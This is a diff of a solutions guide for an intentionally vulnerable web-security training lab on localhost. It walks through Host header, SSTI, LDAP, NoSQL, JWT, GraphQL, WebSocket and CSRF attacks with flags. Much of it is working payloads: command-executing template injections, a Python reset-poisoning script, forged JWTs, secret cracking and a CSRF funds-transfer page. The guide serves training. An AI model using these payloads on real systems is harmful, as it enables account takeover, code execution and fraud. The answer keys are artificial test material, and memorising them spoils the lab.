-3. Implement idempotency keys for all state-changing operations
-4. Use optimistic locking with version numbers
-5. Rate limit requests per user/IP
-6. Implement request deduplication at the API gateway
-7. Use message queues for sequential processing of critical operations
-8. Monitor for unusual concurrent request patterns
-
----
-
-## 9. HTTP Host Header Injection Lab
-
-### Vulnerability Description
-HTTP Host header injection vulnerabilities occur when applications trust the Host header for generating URLs, redirects, or password reset links, allowing attackers to manipulate these values for phishing, cache poisoning, or authentication bypass.
-
-### Impact
-- Password reset poisoning (credential theft)
-- Web cache poisoning (widespread XSS)
-- Session hijacking via crafted URLs
-- SSR (Server-Side Request Forgery) attacks
-- Authentication bypass in multi-tenant applications
-
-### Advanced Solution Steps
-
-#### Step 1: Understand the Vulnerable Password Reset Flow
-**Objective:** Identify how the application uses the Host header
-
-**Normal Password Reset Flow:**
-1. User requests password reset
-2. Application generates reset link: `http://[HOST_HEADER]/reset?token=abc123`
-3. Link sent via email
-4. User clicks link and resets password
-
-**Vulnerable Point:** The application trusts the Host header to build the reset URL
-
-#### Step 2: Basic Host Header Manipulation with Burp Suite
-**Objective:** Inject a malicious host to capture the password reset token
-
-**Using Burp Suite Interceptor:**
-1. Open the HTTP Host Header Injection Lab
-2. Enter an email: `victim@bank.com`
-3. Click "Request Password Reset"
-4. **Intercept the request in Burp Suite:**
-
-**Original Request:**
-```http
-POST /api/vuln/host-header-injection HTTP/1.1
-Host: localhost:5000
-Content-Type: application/json
-
-{"email":"victim@bank.com"}
-```
-
-5. **Modify the Host header:**
-```http
-POST /api/vuln/host-header-injection HTTP/1.1
-Host: attacker.evil.com
-Content-Type: application/json
-
-{"email":"victim@bank.com"}
-```
-
-6. Forward the request
-7. **Check the email preview** in the lab interface
-
-**Poisoned Email Content:**
-```
-Subject: Password Reset Request
-
-Click here to reset your password:
-http://attacker.evil.com/reset?token=a1b2c3d4e5f6
-
-This link will expire in 1 hour.
-```
-
-**Result:** When the victim clicks the link, their reset token is sent to `attacker.evil.com`!
-
-#### Step 3: Advanced Host Header Injection Techniques
-
-**Technique 1: X-Forwarded-Host Header Injection**
-```http
-POST /api/vuln/host-header-injection HTTP/1.1
-Host: localhost:5000
-X-Forwarded-Host: attacker.evil.com
-Content-Type: application/json
-
-{"email":"victim@bank.com"}
-```
-
-**Technique 2: Multiple Host Headers**
-```http
-POST /api/vuln/host-header-injection HTTP/1.1
-Host: localhost:5000
-Host: attacker.evil.com
-Content-Type: application/json
-
-{"email":"victim@bank.com"}
-```
-
-**Technique 3: Host Header with Port Injection**
-```http
-POST /api/vuln/host-header-injection HTTP/1.1
-Host: localhost:5000@attacker.evil.com
-Content-Type: application/json
-
-{"email":"victim@bank.com"}
-```
-
-**Technique 4: Absolute URI in Request Line**
-```http
-POST http://attacker.evil.com/api/vuln/host-header-injection HTTP/1.1
-Host: localhost:5000
-Content-Type: application/json
-
-{"email":"victim@bank.com"}
-```
-
-#### Step 4: Web Cache Poisoning via Host Header
-**Objective:** Poison the cache to affect all users
-
-**Using Burp Suite for Cache Poisoning:**
-
-1. **Identify cacheable endpoints:**
-```http
-GET /api/vuln/host-header-injection/info HTTP/1.1
-Host: attacker.evil.com
-```
-
-2. **Inject malicious Host header:**
-```http
-GET /api/vuln/host-header-injection/info HTTP/1.1
-Host: attacker.evil.com"><script>alert('XSS')</script><"
-Cache-Control: no-cache
-```
-
-3. **Check response headers:**
-```http
-HTTP/1.1 200 OK
-Cache-Control: public, max-age=3600
-X-Cache: MISS
-```
-
-4. **Send request again to populate cache:**
-```http
-X-Cache: HIT
-```
-
-5. **All subsequent users receive the poisoned response**
-
-**Burp Suite Intruder for Cache Poisoning:**
-1. Send request to Intruder
-2. Set payload position on Host header:
-```http
-Host: §attacker.evil.com§
-```
-3. Payloads:
-   - `attacker.evil.com`
-   - `evil.com"><script>alert(1)</script>`
-   - `localhost:5000@attacker.evil.com`
-4. Monitor for successful cache poisoning
-
-#### Step 5: Automated Exploitation Script
-**Objective:** Automate the password reset poisoning attack
-
-**Python Script for Host Header Injection:**
-```python
-import requests
-import time
-
-def exploit_host_header_injection(target_email, evil_host):
-    url = "http://localhost:5000/api/vuln/host-header-injection"
-    
-    headers = {
-        "Host": evil_host,
-        "Content-Type": "application/json"
-    }
-    
-    payload = {
-        "email": target_email
-    }
-    
-    print(f"[*] Sending poisoned password reset request...")
-    print(f"[*] Target email: {target_email}")
-    print(f"[*] Malicious host: {evil_host}")
-    
-    response = requests.post(url, json=payload, headers=headers)
-    
-    if response.status_code == 200:
-        result = response.json()
-        print(f"[+] Success! Reset link poisoned:")
-        print(f"[+] {result.get('resetLink')}")
-        
-        if evil_host in result.get('resetLink', ''):
-            print(f"[+] Host header injection successful!")
-            print(f"[+] Flag: {result.get('flag')}")
-            return True
-    
-    print(f"[-] Exploitation failed")
-    return False
-
-def test_various_injection_methods(target_email):
-    test_cases = [
-        ("attacker.evil.com", "Basic Host header replacement"),
-        ("localhost:5000@attacker.evil.com", "Port-based injection"),
-        ("evil.com:80#@localhost:5000", "Fragment injection"),
-        ("evil.com%23@localhost:5000", "URL-encoded injection"),
-    ]
-    
-    for malicious_host, description in test_cases:
-        print(f"\n[*] Testing: {description}")
-        exploit_host_header_injection(target_email, malicious_host)
-        time.sleep(1)
-
-if __name__ == "__main__":
-    test_various_injection_methods("victim@bank.com")
-```
-
-#### Step 6: Capture the Flag
-**Objective:** Complete the exploitation and retrieve the flag
-
-1. Successfully poison the password reset link
-2. Verify the email preview shows your malicious domain
-3. **Flag reward:** `{HOST_HEADER_INJECTION_PASSWORD_RESET_POISONED}`
-
-**Burp Suite Verification:**
-```http
-POST /api/vuln/host-header-injection HTTP/1.1
-Host: hacker.evil.com
-Content-Type: application/json
-
-{"email":"admin@bank.com"}
-```
-
-**Expected Response:**
-```json
-{
-  "success": true,
-  "message": "Password reset email sent",
-  "resetLink": "http://hacker.evil.com/reset?token=xyz789",
-  "flag": "{HOST_HEADER_INJECTION_PASSWORD_RESET_POISONED}"
-}
-```
-
-### Real-World Attack Scenarios
-
-**Scenario 1: Credential Harvesting**
-1. Attacker sends poisoned reset request with Host: attacker.com
-2. Victim receives email with link to attacker.com
-3. Victim clicks link, token sent to attacker's server
-4. Attacker uses token to reset victim's password
-
-**Scenario 2: Mass Cache Poisoning**
-1. Attacker poisons CDN cache with malicious Host header
-2. All users receive cached response with XSS payload
-3. Widespread account compromise
-
-**Scenario 3: Multi-Tenant Bypass**
-1. SaaS application uses Host header for tenant identification
-2. Attacker manipulates Host header to access other tenants
-3. Cross-tenant data exposure
-
-### Advanced Prevention Measures
-1. Never use Host header for security-sensitive operations
-2. Use absolute URLs with hardcoded domains
-3. Validate Host header against whitelist
-4. Implement proper virtual host configuration
-5. Use HSTS (HTTP Strict Transport Security)
-6. Configure web servers to reject ambiguous requests
-7. Implement domain pinning for password reset links
-8. Use separate domains for administrative functions
-9. Monitor for unusual Host header values
-10. Implement rate limiting on password reset endpoints
-
----
-
-## Intermediate Lab Bypass Techniques
-
-### Overview
-All intermediate labs include at least one bypass method designed for intermediate-level complexity. These bypass techniques simulate real-world scenarios where simple exploitation is blocked by security controls.
-
-### 1. Server-Side Template Injection (SSTI) Bypass Methods
-
-#### Bypass Method 1: Alternate Delimiter Bypass
-**Vulnerability:** WAF blocks standard `{{...}}` delimiters  
-**Bypass:** Use alternate `{%...%}` delimiters
-
-**Exploitation:**
-```bash
-# Standard payload (may be blocked)
-curl "http://localhost:5000/api/vuln/ssti?template={{7*7}}"
-
-# Bypass using alternate delimiters
-curl "http://localhost:5000/api/vuln/ssti?template={%print(7*7)%}"
-# Flag: {SSTI_WAF_BYPASS_ALTERNATE_DELIMITERS}
-```
-
-#### Bypass Method 2: Attribute Chain Bypass
-**Vulnerability:** Filters block direct RCE keywords  
-**Bypass:** Use attribute chaining to access dangerous functions
-
-**Exploitation:**
-```bash
-# Use Python attribute chaining
-curl "http://localhost:5000/api/vuln/ssti?template={{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"
-# Flag: {SSTI_FILTER_BYPASS_ATTRIBUTE_CHAIN}
-```
-
-### 2. JWT Manipulation Bypass Method
-
-#### Bypass Method: "none" Algorithm Bypass
-**Vulnerability:** Server accepts unsigned JWTs with alg="none"  
-**Bypass:** Remove signature and set algorithm to "none"
-
-**Exploitation:**
-```bash
-# Original JWT header (base64): {"alg":"HS256","typ":"JWT"}
-# Change to: {"alg":"none","typ":"JWT"}
-# Base64 encode: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0
-
-# Original payload (base64): {"sub":"1234567890","name":"Guest","admin":false}
-# Change to: {"sub":"1234567890","name":"Guest","admin":true}
-# Base64 encode: eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6Ikd1ZXN0IiwiYWRtaW4iOnRydWV9
-
-# Construct token without signature (note the trailing dot)
-curl "http://localhost:5000/api/vuln/jwt-manipulation?token=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6Ikd1ZXN0IiwiYWRtaW4iOnRydWV9."
-# Flag: {JWT_NONE_ALGORITHM_BYPASS}
-```
-
-### 3. NoSQL Injection Bypass Methods
-
-#### Bypass Method 1: $gt Operator
-**Vulnerability:** Basic $ne blocked but $gt allowed  
-**Bypass:** Use greater-than operator for authentication bypass
-
-**Exploitation:**
-```bash
-curl 'http://localhost:5000/api/vuln/nosql-injection?username={"$gt":""}'
-# Flag: {NOSQL_GT_OPERATOR_BYPASS}
-```
-
-#### Bypass Method 2: $regex Operator
-**Vulnerability:** Regex operators not sanitized  
-**Bypass:** Use regex for pattern-based authentication bypass
-
-**Exploitation:**
-```bash
-curl 'http://localhost:5000/api/vuln/nosql-injection?username={"$regex":"^a"}'
-# Flag: {NOSQL_REGEX_INJECTION}
-```
-
-#### Bypass Method 3: $where JavaScript Execution
-**Vulnerability:** $where clause allows JavaScript execution  
-**Bypass:** Inject JavaScript code for authentication bypass
-
-**Exploitation:**
-```bash
-curl 'http://localhost:5000/api/vuln/nosql-injection?username={"$where":"1==1"}'
-# Flag: {NOSQL_WHERE_CODE_EXECUTION}
-```
-
-### 4. GraphQL Injection Bypass Methods
-
-#### Bypass Method 1: Introspection Query
-**Vulnerability:** Introspection not disabled in production  
-**Bypass:** Query schema to discover hidden fields
-
-**Exploitation:**
-```bash
-curl 'http://localhost:5000/api/vuln/graphql-injection?query={__schema{types{name}}}'
-# Flag: {GRAPHQL_INTROSPECTION_BYPASS}
-```
-
-#### Bypass Method 2: Query Batching
-**Vulnerability:** Multiple queries allowed in single request  
-**Bypass:** Batch multiple queries to extract more data
-
-**Exploitation:**
-```bash
-curl 'http://localhost:5000/api/vuln/graphql-injection?query=[{users{id}},{posts{title}}]'
-# Flag: {GRAPHQL_BATCH_QUERY_BYPASS}
-```
-
-#### Bypass Method 3: Deep Nesting / Depth Limit Bypass
-**Vulnerability:** No query depth limits enforced  
-**Bypass:** Use deeply nested queries to access sensitive data
-
-**Exploitation:**
-```bash
-curl 'http://localhost:5000/api/vuln/graphql-injection?query={users{posts{comments{author{posts{comments{id}}}}}}}'
-# Flag: {GRAPHQL_DEPTH_LIMIT_BYPASS}
-```
-
-#### Bypass Method 4: __typename Field Suggestion
-**Vulnerability:** Type information exposes sensitive fields  
-**Bypass:** Use __typename to discover field types
-
-**Exploitation:**
-```bash
-curl 'http://localhost:5000/api/vuln/graphql-injection?query={users{id,username,__typename}}'
-# Flag: {GRAPHQL_TYPENAME_DISCLOSURE}
-```
-
-### 5. WebSocket Manipulation Bypass Method
-
-#### Bypass Method: Origin Validation Bypass
-**Vulnerability:** Weak origin validation using substring check  
-**Bypass:** Use domain with "trusted" substring
-
-**Exploitation Using Burp Suite:**
-1. Intercept WebSocket upgrade request
-2. Modify Origin header to: `http://evil.trusted.com` or `http://trusted-attacker.com`
-3. Server accepts connection due to substring match
-4. Flag: {WEBSOCKET_ORIGIN_VALIDATION_BYPASS}
-
-### 6. HTTP Host Header Injection Bypass Methods
-
-#### Bypass Method 1: X-Forwarded-Host Header
-**Vulnerability:** Application trusts X-Forwarded-Host over Host  
-**Bypass:** Use X-Forwarded-Host to poison reset links
-
-**Exploitation Using Burp Suite:**
-1. Intercept password reset request
-2. Add header: `X-Forwarded-Host: attacker.com`
-3. Server uses X-Forwarded-Host in reset link
-4. Flag: {HOST_HEADER_X_FORWARDED_HOST_BYPASS}
+- Remote Code Execution (RCE)
+- Server-side file access
+- Environment variable exposure
+- Complete server compromise
+
+### Solution Steps
+
+#### Step 1: Template Engine Detection
+**Objective:** Identify the template engine being used
 
 **Using curl:**
 ```bash
-curl -X POST "http://localhost:5000/api/vuln/host-header-injection/reset" \
-  -H "Content-Type: application/json" \
-  -H "X-Forwarded-Host: evil.com" \
-  -d '{"email":"victim@company.com"}'
-```
-
-#### Bypass Method 2: X-Original-Host Header
-**Vulnerability:** Alternative header not sanitized  
-**Bypass:** Use X-Original-Host header
-
-**Exploitation:**
-```bash
-curl -X POST "http://localhost:5000/api/vuln/host-header-injection/reset" \
-  -H "Content-Type: application/json" \
-  -H "X-Original-Host: attacker.com" \
-  -d '{"email":"victim@company.com"}'
-# Flag: {HOST_HEADER_X_ORIGINAL_HOST_BYPASS}
-```
-
-### 7. LDAP Injection Bypass Methods
-
-#### Bypass Method 1: Wildcard Filter Bypass
-**Vulnerability:** LDAP filter doesn't sanitize wildcard characters  
-**Bypass:** Use `*` wildcard to match all entries
-
-**Exploitation:**
-```bash
-# Standard login attempt (fails without valid credentials)
-curl "http://localhost:5000/api/vuln/ldap-injection?username=admin&password=wrongpass"
-
-# Wildcard bypass to dump all directory entries
-curl "http://localhost:5000/api/vuln/ldap-injection?username=*"
-# Flag: {LDAP_INJECTION_WILDCARD_BYPASS}
+# Test basic template syntax
+curl "http://localhost:5000/api/vuln/ssti?template={{7*7}}"
+curl "http://localhost:5000/api/vuln/ssti?template=\${7*7}"
+curl "http://localhost:5000/api/vuln/ssti?template=#{7*7}"
 ```
 
 **Using Burp Suite:**
-1. Intercept the LDAP search request
-2. Modify username parameter to: `*`
-3. Server returns all LDAP directory entries including admin accounts
-4. Extract sensitive information from directory listings
+1. Intercept GET request to `/api/vuln/ssti`
+2. Modify `template` parameter with test payloads
+3. Look for mathematical evaluation in response (49 indicates vulnerable)
 
-#### Bypass Method 2: Comment Injection
-**Vulnerability:** LDAP comment syntax not filtered  
-**Bypass:** Use `#` or `//` to comment out password check
-
-**Exploitation:**
-```bash
-# Comment out the password portion of LDAP filter
-curl "http://localhost:5000/api/vuln/ldap-injection?username=admin)%23"
-# This transforms filter from: (username=admin)(password=xxx) 
-# To: (username=admin)# <- password check commented out
+**Expected Response:**
+```
+Result: 49
 ```
 
-#### Bypass Method 3: Boolean-Based LDAP Injection
-**Vulnerability:** LDAP operators not sanitized  
-**Bypass:** Use OR operator to always match
+#### Step 2: Basic Exploitation
+**Objective:** Execute code to retrieve environment variables
 
-**Exploitation:**
+**Using curl:**
 ```bash
-# OR injection to bypass authentication
-curl "http://localhost:5000/api/vuln/ldap-injection?username=*)(uid=*"
-# Creates filter: (username=*)(uid=*) - always true
+# Node.js template injection
+curl "http://localhost:5000/api/vuln/ssti?template={{constructor.constructor('return process.env')()}}"
+
+# Alternative payload
+curl "http://localhost:5000/api/vuln/ssti?template={{global.process.mainModule.require('child_process').execSync('whoami').toString()}}"
 ```
 
-### 8. Advanced CSRF - SameSite=None Bypass
+**Flag:** `{SSTI_CODE_EXECUTION_SUCCESSFUL}`
 
-#### Bypass Method: SameSite=None Cookie Exploitation
-**Vulnerability:** Cookies set with SameSite=None attribute  
-**Bypass:** Create cross-site request that includes vulnerable cookies
+#### Step 3: WAF Bypass - Alternate Delimiters ⭐
+**Bypass Technique:** Use alternate delimiter syntax to bypass WAF filters
 
-**Exploitation Using Burp Suite:**
+**Using curl:**
+```bash
+# Use {%...%} delimiters instead of {{...}}
+curl "http://localhost:5000/api/vuln/ssti?template={%print(7*7)%}"
+```
 
-**Step 1: Analyze the Session Cookie**
-1. Navigate to the Advanced CSRF lab
-2. In Burp's Proxy → HTTP History, find the Set-Cookie header
-3. Observe: `Set-Cookie: csrf_session=user_123; SameSite=None`
-4. This cookie WILL be sent in cross-origin requests!
+**Using Burp Suite:**
+1. Intercept request
+2. Try various delimiter combinations: `{%...%}`, `{#...#}`, `<%...%>`
+3. WAF may block `{{` but miss `{%`
 
-**Step 2: Analyze CSRF Token Weakness**
-1. Examine the CSRF token generation in lab interface
-2. Token format: `csrf_${timestamp}` (predictable!)
-3. Token uses current Unix timestamp - easily guessable
+**Flag:** `{SSTI_WAF_BYPASS_ALTERNATE_DELIMITERS}`
 
-**Step 3: Create Malicious Page**
+#### Step 4: Filter Evasion - Attribute Chain Bypass ⭐
+**Bypass Technique:** Use attribute chaining to access dangerous functions
+
+**Using curl:**
+```bash
+# Python-style attribute access (if using Jinja2/similar)
+curl "http://localhost:5000/api/vuln/ssti?template={{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"
+
+# Alternative: String concatenation to bypass keyword filters
+curl "http://localhost:5000/api/vuln/ssti?template={{constructor.constructor('return pro'+'cess.env')()}}"
+```
+
+**Using Burp Suite:**
+1. Capture request in Repeater
+2. Test attribute chain variations
+3. Use string concatenation to bypass keyword blacklists
+
+**Flag:** `{SSTI_FILTER_BYPASS_ATTRIBUTE_CHAIN}`
+
+### Prevention Measures
+- Never embed user input directly into templates
+- Use template sandboxing (e.g., `vm2` for Node.js)
+- Implement strict input validation and sanitization
+- Use logic-less template engines where possible
+- Apply Content Security Policy (CSP) headers
+
+---
+
+## 2. LDAP Injection
+
+### Vulnerability Description
+LDAP Injection exploits applications that construct LDAP queries from user input without proper sanitization, allowing attackers to modify query logic.
+
+### Lab URL
+`http://localhost:5000/api/vuln/ldap-injection`
+
+### Impact
+- Authentication bypass
+- Unauthorized data access
+- Information disclosure
+- Directory enumeration
+
+### Solution Steps
+
+#### Step 1: Basic Authentication Bypass
+**Objective:** Bypass LDAP authentication using injection techniques
+
+**Using curl:**
+```bash
+# LDAP OR injection
+curl "http://localhost:5000/api/vuln/ldap-injection?username=*)(uid=*))(|(uid=*&password=anything"
+
+# Alternative: Comment out password check
+curl "http://localhost:5000/api/vuln/ldap-injection?username=admin)(&(password=*))&password=wrong"
+```
+
+**Using Burp Suite:**
+1. Intercept login request
+2. Modify username parameter: `*)(uid=*))(|(uid=*`
+3. Common LDAP injection payloads:
+   - `*`
+   - `*)(uid=*`
+   - `admin)(&(password=*))`
+   - `admin))(|(uid=*`
+
+**Flag:** `{LDAP_INJECTION_AUTH_BYPASS}`
+
+#### Step 2: Wildcard Filter Bypass ⭐
+**Bypass Technique:** Use wildcard character to dump directory entries
+
+**Using curl:**
+```bash
+# Wildcard to match all users
+curl "http://localhost:5000/api/vuln/ldap-injection?username=*"
+```
+
+**Using Burp Suite:**
+1. Intercept search request
+2. Modify username to `*`
+3. Response shows all directory entries (LDAP dump)
+
+**Expected Response:**
+```json
+{
+  "users": [
+    {"uid": "admin", "cn": "Administrator", "email": "admin@zeroday.lab"},
+    {"uid": "user1", "cn": "John Doe", "email": "john@zeroday.lab"},
+    ...
+  ]
+}
+```
+
+**Flag:** `{LDAP_INJECTION_WILDCARD_BYPASS}`
+
+#### Step 3: Comment Injection Bypass ⭐
+**Bypass Technique:** Use LDAP comments to ignore password validation
+
+**Using curl:**
+```bash
+# Null byte or comment to terminate query
+curl "http://localhost:5000/api/vuln/ldap-injection?username=admin%00&password=anything"
+curl "http://localhost:5000/api/vuln/ldap-injection?username=admin)%00&password=anything"
+```
+
+**Flag:** `{LDAP_COMMENT_INJECTION_BYPASS}`
+
+#### Step 4: Boolean-Based Blind LDAP ⭐
+**Bypass Technique:** Extract data character by character using boolean conditions
+
+**Using curl with automation:**
+```bash
+#!/bin/bash
+# Extract admin password length
+for i in {1..50}; do
+  response=$(curl -s "http://localhost:5000/api/vuln/ldap-injection?username=admin)(|(password=*))(&(cn=*))(&(objectClass=*")
+  if [[ $response == *"success"* ]]; then
+    echo "Password length: $i"
+    break
+  fi
+done
+```
+
+**Using Burp Suite Intruder:**
+1. Send request to Intruder
+2. Payload position: `admin)(|(password=§a§*))(&(cn=*`
+3. Character brute force: a-z, A-Z, 0-9
+4. Analyze response differences
+
+**Flag:** `{LDAP_BOOLEAN_BLIND_INJECTION}`
+
+### Prevention Measures
+- Use parameterized LDAP queries
+- Implement strict input validation
+- Escape special LDAP characters: `*()|\&`
+- Use allowlists for acceptable characters
+- Implement account lockout mechanisms
+
+---
+
+## 3. NoSQL Injection
+
+### Vulnerability Description
+NoSQL Injection exploits NoSQL databases (MongoDB, CouchDB, etc.) that accept JSON/JavaScript operators in queries without proper validation.
+
+### Lab URL
+`http://localhost:5000/api/vuln/nosql-injection`
+
+### Impact
+- Authentication bypass
+- Data extraction
+- Privilege escalation
+- Database enumeration
+
+### Solution Steps
+
+#### Step 1: Basic Authentication Bypass
+**Objective:** Bypass login using NoSQL operators
+
+**Using curl:**
+```bash
+# $ne (not equal) operator
+curl -X POST http://localhost:5000/api/vuln/nosql-injection \
+  -H "Content-Type: application/json" \
+  -d '{"username":"admin","password":{"$ne":""}}'
+
+# $or operator
+curl -X POST http://localhost:5000/api/vuln/nosql-injection \
+  -H "Content-Type: application/json" \
+  -d '{"username":{"$or":[{"username":"admin"},{"username":""}]},"password":"anything"}'
+```
+
+**Using Burp Suite:**
+1. Intercept POST request
+2. Modify JSON body to use MongoDB operators
+3. Common operators: `$ne`, `$gt`, `$regex`, `$where`
+
+**Flag:** `{NOSQL_INJECTION_AUTH_BYPASS}`
+
+#### Step 2: $gt Operator Bypass ⭐
+**Bypass Technique:** Use greater-than operator for authentication bypass
+
+**Using curl:**
+```bash
+# Greater than empty string matches all
+curl -X POST http://localhost:5000/api/vuln/nosql-injection \
+  -H "Content-Type: application/json" \
+  -d '{"username":{"$gt":""},"password":{"$gt":""}}'
+```
+
+**Using Burp Suite:**
+1. Change JSON to: `{"username":{"$gt":""}}`
+2. Server evaluates `username > ""` which is always true
+3. Returns first user in database
+
+**Flag:** `{NOSQL_GT_OPERATOR_BYPASS}`
+
+#### Step 3: $regex Operator Bypass ⭐
+**Bypass Technique:** Use regex for pattern-based bypass and data extraction
+
+**Using curl:**
+```bash
+# Regex to match admin user
+curl -X POST http://localhost:5000/api/vuln/nosql-injection \
+  -H "Content-Type: application/json" \
+  -d '{"username":{"$regex":"^a"},"password":{"$ne":""}}'
+
+# Extract password character by character
+curl -X POST http://localhost:5000/api/vuln/nosql-injection \
+  -H "Content-Type: application/json" \
+  -d '{"username":"admin","password":{"$regex":"^p"}}'
+```
+
+**Using Burp Suite Intruder:**
+1. Set payload: `{"username":"admin","password":{"$regex":"^§a§"}}`
+2. Brute force first character: a-z
+3. On success, move to second character: `^p§a§`
+4. Continue until full password extracted
+
+**Flag:** `{NOSQL_REGEX_INJECTION}`
+
+#### Step 4: $where JavaScript Execution ⭐
+**Bypass Technique:** Execute JavaScript via $where clause
+
+**Using curl:**
+```bash
+# Always true condition
+curl -X POST http://localhost:5000/api/vuln/nosql-injection \
+  -H "Content-Type: application/json" \
+  -d '{"username":{"$where":"1==1"}}'
+
+# Sleep-based blind injection
+curl -X POST http://localhost:5000/api/vuln/nosql-injection \
+  -H "Content-Type: application/json" \
+  -d '{"username":{"$where":"sleep(5000)"}}'
+```
+
+**Using Burp Suite:**
+1. Inject `$where` clause with JavaScript
+2. Test with: `{"$where":"this.username=='admin'"}`
+3. Advanced: Extract data using string methods
+
+**Flag:** `{NOSQL_WHERE_CODE_EXECUTION}`
+
+### Prevention Measures
+- Never pass user input directly to query operators
+- Use object validation libraries (e.g., Joi, Validator.js)
+- Disable JavaScript execution in database (`--noscripting`)
+- Implement strict type checking
+- Use ORMs with built-in sanitization
+
+---
+
+## 4. JWT Manipulation
+
+### Vulnerability Description
+JSON Web Token vulnerabilities arise from weak signature verification, algorithm confusion, and improper validation of JWT claims.
+
+### Lab URL
+`http://localhost:5000/api/vuln/jwt-manipulation`
+
+### Impact
+- Authentication bypass
+- Privilege escalation
+- Account takeover
+- Unauthorized access to resources
+
+### Solution Steps
+
+#### Step 1: JWT Structure Analysis
+**Objective:** Understand JWT structure and identify vulnerabilities
+
+**Using jwt.io or command line:**
+```bash
+# Decode JWT (base64)
+echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c" | cut -d'.' -f1 | base64 -d
+```
+
+**JWT Structure:**
+```
+Header:  {"alg":"HS256","typ":"JWT"}
+Payload: {"sub":"1234567890","name":"John Doe","iat":1516239022}
+Signature: HMACSHA256(base64(header) + "." + base64(payload), secret)
+```
+
+#### Step 2: Algorithm Confusion Attack
+**Objective:** Change RS256 to HS256 to bypass signature verification
+
+**Using curl:**
+```bash
+# Get JWT from login endpoint
+TOKEN=$(curl -s http://localhost:5000/api/vuln/jwt-manipulation/login)
+
+# Decode, change algorithm, re-sign with public key
+# (Use jwt_tool or manual scripting)
+```
+
+**Manual steps:**
+1. Get public key from server
+2. Change JWT header: `{"alg":"HS256","typ":"JWT"}`
+3. Use public key as HMAC secret to sign
+4. Server verifies HS256 signature using public key
+
+**Flag:** `{JWT_ALGORITHM_CONFUSION}`
+
+#### Step 3: "none" Algorithm Bypass ⭐
+**Bypass Technique:** Remove signature verification by using "none" algorithm
+
+**Using curl:**
+```bash
+# Create JWT with "none" algorithm
+# Header: {"alg":"none","typ":"JWT"}
+# Base64: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0
+
+# Payload: {"sub":"1234567890","name":"Guest","admin":true}
+# Base64: eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6Ikd1ZXN0IiwiYWRtaW4iOnRydWV9
+
+# Final token (note trailing dot, no signature):
+TOKEN="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6Ikd1ZXN0IiwiYWRtaW4iOnRydWV9."
+
+curl -H "Authorization: Bearer $TOKEN" http://localhost:5000/api/vuln/jwt-manipulation/admin
+```
+
+**Using Burp Suite:**
+1. Intercept request with JWT
+2. Decode JWT
+3. Change header to `{"alg":"none","typ":"JWT"}`
+4. Modify payload: set `"admin":true`
+5. Remove signature (keep trailing dot)
+6. Base64 encode header and payload
+7. Send: `header.payload.`
+
+**Flag:** `{JWT_NONE_ALGORITHM_BYPASS}`
+
+#### Step 4: Weak Secret Brute Force
+**Objective:** Crack JWT secret using dictionary attack
+
+**Using jwt_tool:**
+```bash
+# Download jwt_tool
+git clone https://github.com/ticarpi/jwt_tool
+cd jwt_tool
+
+# Crack secret
+python3 jwt_tool.py <JWT_TOKEN> -C -d /usr/share/wordlists/rockyou.txt
+```
+
+**Using hashcat:**
+```bash
+# Save JWT to file
+echo "JWT_TOKEN" > jwt.txt
+
+# Crack with hashcat
+hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
+```
+
+**Flag:** `{JWT_WEAK_SECRET_CRACKED}`
+
+### Prevention Measures
+- Always verify JWT algorithm matches expected type
+- Reject "none" algorithm explicitly
+- Use strong, random secrets (256+ bits)
+- Implement token expiration (exp claim)
+- Use asymmetric algorithms (RS256) for distributed systems
+- Validate all claims (iss, aud, exp, nbf)
+
+---
+
+## 5. Advanced CSRF
+
+### Vulnerability Description
+Cross-Site Request Forgery attacks that bypass modern protections like CSRF tokens, SameSite cookies, and referrer checks.
+
+### Lab URL
+`http://localhost:5000/api/vuln/csrf-advanced`
+
+### Impact
+- Unauthorized actions on behalf of authenticated users
+- Account takeover
+- Financial fraud
+- Data modification
+
+### Solution Steps
+
+#### Step 1: Identify CSRF Protection Mechanisms
+**Objective:** Analyze the application's CSRF defenses
+
+**Using curl:**
+```bash
+# Check for CSRF tokens
+curl -i http://localhost:5000/api/vuln/csrf-advanced
+
+# Analyze cookies
+curl -i http://localhost:5000/api/vuln/csrf-advanced | grep -i "set-cookie"
+```
+
+**Using Burp Suite:**
+1. Intercept form submission
+2. Look for CSRF tokens in forms/headers
+3. Check cookie attributes: `SameSite`, `Secure`, `HttpOnly`
+4. Note: `SameSite=None` allows cross-site cookie sending
+
+#### Step 2: Basic CSRF Attack
+**Objective:** Perform state-changing action from malicious site
+
+**Create evil.html:**
 ```html
-<!-- Save as evil.html and host on different origin -->
 <!DOCTYPE html>
 <html>
 <body>
-<h1>Win a Free iPhone!</h1>
-<form id="csrf" action="http://localhost:5000/api/vuln/csrf-advanced/transfer" method="POST">
-  <input type="hidden" name="recipient" value="attacker@evil.com">
-  <input type="hidden" name="amount" value="10000">
-  <input type="hidden" name="csrf_token" id="token">
-</form>
-<script>
-  // Predict CSRF token using timestamp
-  const timestamp = Math.floor(Date.now() / 1000);
-  document.getElementById('token').value = 'csrf_' + timestamp;
-  
-  // Auto-submit form
-  document.getElementById('csrf').submit();
-</script>
+  <h1>Click here to win a prize!</h1>
+  <form id="csrf" action="http://localhost:5000/api/vuln/csrf-advanced/transfer" method="POST">
+    <input type="hidden" name="recipient" value="attacker@evil.com">
+    <input type="hidden" name="amount" value="1000">
+  </form>
+  <script>
+    document.getElementById('csrf').submit();
+  </script>
 </body>
 </html>
 ```
 
-**Step 4: Host and Test**
+**Host the page:**
 ```bash
-# Host malicious page on different port/domain
+# Start simple HTTP server
 python3 -m http.server 8000
 
-# When victim (logged into bank) visits http://localhost:8000/evil.html
-# The SameSite=None cookie is sent with the CSRF attack!
-# Flag: {CSRF_SAMESITE_BYPASS_SUCCESSFUL}
